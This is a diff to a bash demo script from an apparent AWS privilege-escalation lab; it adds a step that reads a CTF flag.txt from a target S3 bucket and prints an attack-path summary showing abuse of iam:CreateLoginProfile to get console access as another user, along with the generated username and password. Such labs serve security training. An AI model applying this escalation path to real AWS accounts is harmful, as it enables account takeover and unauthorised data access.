@@ -207,17 +207,34 @@ fi
 echo "The hop1 user can now log in via the AWS Console."
 echo -e "${GREEN}✓ Login profile confirmed!${NC}\n"
 
+# [OBSERVATION] Step 9: Read the CTF flag from the target bucket
+echo -e "${YELLOW}Step 9: Reading CTF flag from the target bucket${NC}"
+echo "Accessing s3://$TARGET_BUCKET/flag.txt as the hop1 user (via readonly simulation)"
+use_readonly_creds
+show_cmd "ReadOnly" "aws s3 cp s3://$TARGET_BUCKET/flag.txt -"
+FLAG_VALUE=$(aws s3 cp s3://$TARGET_BUCKET/flag.txt - 2>/dev/null)
+if [ -n "$FLAG_VALUE" ]; then
+    echo -e "${GREEN}✓ CTF Flag captured:${NC} $FLAG_VALUE"
+else
+    echo -e "${RED}✗ Could not read flag.txt from bucket${NC}"
+fi
+echo ""
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 # Summary
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}Attack Summary${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
 echo -e "Step 1: Used ${YELLOW}iam:CreateLoginProfile${NC} to create console password for $HOP1_USER"
 echo -e "Step 2: Gained ${YELLOW}S3 Bucket Access${NC} (console login)"
-echo -e "Result: ${GREEN}S3 Bucket Access${NC}"
+echo -e "Step 3: Read ${YELLOW}flag.txt${NC} from target bucket"
+echo -e "Result: ${GREEN}S3 Bucket Access + CTF Flag${NC}"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER → (CreateLoginProfile) → $HOP1_USER → Console Login → S3 Bucket ($TARGET_BUCKET)"
+echo -e "  $STARTING_USER → (CreateLoginProfile) → $HOP1_USER → Console Login → S3 Bucket ($TARGET_BUCKET) → flag.txt (CTF flag)"
 echo ""
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
@@ -234,11 +251,14 @@ echo -e "  URL: ${YELLOW}$CONSOLE_URL${NC}"
 echo -e "  Username: ${YELLOW}$HOP1_USER${NC}"
 echo -e "  Password: ${YELLOW}$PASSWORD${NC}"
 echo ""
+
+if [ -n "$FLAG_VALUE" ]; then
+    echo -e "${GREEN}CTF Flag:${NC} ${YELLOW}$FLAG_VALUE${NC}"
+    echo ""
+fi
+
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to delete the login profile${NC}"
 echo ""
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
